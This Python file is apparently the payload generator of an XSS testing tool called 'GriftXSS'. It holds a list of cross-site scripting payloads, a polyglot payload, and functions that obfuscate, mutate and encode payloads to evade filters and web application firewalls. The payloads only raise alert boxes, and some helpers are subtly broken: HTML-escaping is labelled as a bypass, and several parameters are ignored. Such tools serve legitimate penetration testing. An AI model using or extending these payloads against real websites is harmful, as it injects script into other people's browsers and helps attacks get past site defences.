import random
import string
import hashlib
import time
import urllib.parse
import html
from typing import List, Optional

class PayloadGenerator:
    def __init__(self):
        self.base_payloads = [
            "<script>alert('GriftXSS')</script>",
            "javascript:alert('GriftXSS')",
            "<img src=x onerror=alert('GriftXSS')>",
            "<svg onload=alert('GriftXSS')>",
            "'-alert('GriftXSS')-'",
            "\"><script>alert('GriftXSS')</script>",
            "<iframe src=\"javascript:alert('GriftXSS')\"></iframe>",
            "<details open ontoggle=alert('GriftXSS')>",
            "<audio src=x onerror=alert('GriftXSS')>",
            "<video src=x onerror=alert('GriftXSS')>",
        ]

    def get_random_payload(self):
        """Return a random payload from the base list."""
        return random.choice(self.base_payloads)

    def generate(self, num_payloads=100):
        payloads = self.base_payloads.copy()
        while len(payloads) < num_payloads:
            payload = self._generate_random_payload()
            if payload not in payloads:
                payloads.append(payload)
        return payloads

    def _generate_random_payload(self):
        payload_types = [
            self._generate_script_payload,
            self._generate_img_payload,
            self._generate_svg_payload,
            self._generate_javascript_payload,
            self._generate_event_payload,
            self.generate_unique_payload,
            self.generate_encoded_payload,
            self.generate_obfuscated_payload,
            self.generate_dom_based_payload,
            self.generate_attribute_payload,
            self.generate_custom_payload,
            self.generate_polyglot_payload,
            self.generate_waf_evasion_payload
        ]
        return random.choice(payload_types)()

    def _generate_script_payload(self):
        return f"<script>{self._generate_random_js()}</script>"

    def _generate_img_payload(self):
        return f"<img src=x onerror={self._generate_random_js()}>"

    def _generate_svg_payload(self):
        return f"<svg onload={self._generate_random_js()}>"

    def _generate_javascript_payload(self):
        return f"javascript:{self._generate_random_js()}"

    def _generate_event_payload(self):
        events = ['onmouseover', 'onmouseout', 'onclick', 'onload', 'onerror']
        return f"<div {random.choice(events)}={self._generate_random_js()}>"

    def _generate_random_js(self):
        js_functions = ['alert', 'console.log', 'prompt', 'confirm']
        return f"{random.choice(js_functions)}('{self._generate_random_string()}')"

    def _generate_random_string(self, length=5):
        return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

    def generate_unique_payload(self):
        """Generate a unique GriftXSS payload."""
        unique_id = hashlib.md5(str(time.time()).encode()).hexdigest()[:8]
        return f"<script>alert('{unique_id}')</script>"

    def generate_encoded_payload(self, payload=None):
        """Encode the payload to potentially bypass filters."""
        if payload is None:
            payload = self.get_random_payload()
        return payload.replace('<', '&lt;').replace('>', '&gt;')

    def generate_obfuscated_payload(self, payload=None):
        """Obfuscate the payload to potentially bypass filters."""
        if payload is None:
            payload = self.get_random_payload()
        obfuscated = ""
        for char in payload:
            if random.choice([True, False]):
                obfuscated += f"&#x{ord(char):x};"
            else:
                obfuscated += char
        return obfuscated

    def generate_dom_based_payload(self):
        """Generate a payload targeting DOM-based GXSS."""
        return "javascript:document.write('<img src=x onerror=alert(document.domain)>')"

    def generate_attribute_payload(self):
        """Generate a payload for attribute-based GriftXSS."""
        return "\" onmouseover=\"alert('GriftXSS')\""

    def generate_custom_payload(self, message="GriftXSS", tag="script"):
        """Generate a custom payload with a specific message and tag."""
        return f"<{tag}>alert('{message}')</{tag}>"

    def generate_polyglot_payload(self):
        """Generate a polyglot GXSS payload that can work in multiple contexts."""
        return "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */onerror=alert('GriftXSS') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('GriftXSS')//>\x3e"

    def generate_waf_evasion_payload(self):
        """Generate a payload that attempts to evade Web Application Firewalls."""
        return "<script>eval(atob('YWxlcnQoJ1hTUycp'))</script>"

    def generate_multiple_payloads(self, count=5):
        """Generate multiple unique payloads."""
        payloads = []
        for _ in range(count):
            payload = self.generate_unique_payload()
            payloads.append(payload)
        return payloads

    def mutate_payload(self, payload=None):
        """Mutate an existing payload to create a variation."""
        if payload is None:
            payload = self.get_random_payload()
        mutations = [
            lambda p: p.replace('alert', 'confirm'),
            lambda p: p.replace('GriftXSS', 'X' + ''.join(random.choices(string.ascii_uppercase + string.digits, k=2))),
            lambda p: p.replace('<script>', '<scr<script>ipt>'),
            lambda p: self.generate_obfuscated_payload(p),
        ]
        return random.choice(mutations)(payload)

    def generate_encoded_payloads(self, payloads: List[str]) -> List[str]:
        """
        Generate URL-encoded and HTML-encoded variants of the given payloads.
        """
        encoded_payloads = []
        
        for payload in payloads:
            # URL encoding
            url_encoded = urllib.parse.quote(payload)
            encoded_payloads.append(url_encoded)
            
            # HTML encoding
            html_encoded = html.escape(payload)
            encoded_payloads.append(html_encoded)
            
            # Double URL encoding
            double_url_encoded = urllib.parse.quote(urllib.parse.quote(payload))
            encoded_payloads.append(double_url_encoded)
        
        return encoded_payloads

    def generate_waf_evasion_payloads(self, payloads: List[str]) -> List[str]:
        """
        Generate WAF evasion variants of the given payloads.
        """
        evasion_payloads = []
        
        for payload in payloads:
            # Case variation
            evasion_payloads.append(payload.swapcase())
            
            # Null byte injection
            evasion_payloads.append(payload.replace('<', '%00<'))
            
            # Unicode encoding
            evasion_payloads.append(payload.encode('unicode_escape').decode())
            
            # HTML entity encoding
            evasion_payloads.append(payload.replace('<', '&lt;').replace('>', '&gt;'))
            
            # JavaScript string concatenation
            evasion_payloads.append('+'.join(f"'{c}'" for c in payload))
        
        return evasion_payloads

def generate_payloads(num_payloads: int = 10, min_length: int = 5, max_length: int = 20) -> List[str]:
    generator = PayloadGenerator()
    return generator.generate(num_payloads)

def mutate_payload(payload: str, mutation_rate: float = 0.1) -> str:
    generator = PayloadGenerator()
    return generator.mutate_payload(payload)

def generate_encoded_payloads(payloads: List[str]) -> List[str]:
    generator = PayloadGenerator()
    return generator.generate_encoded_payloads(payloads)

def generate_waf_evasion_payloads(payloads: List[str]) -> List[str]:
    generator = PayloadGenerator()
    return generator.generate_waf_evasion_payloads(payloads)
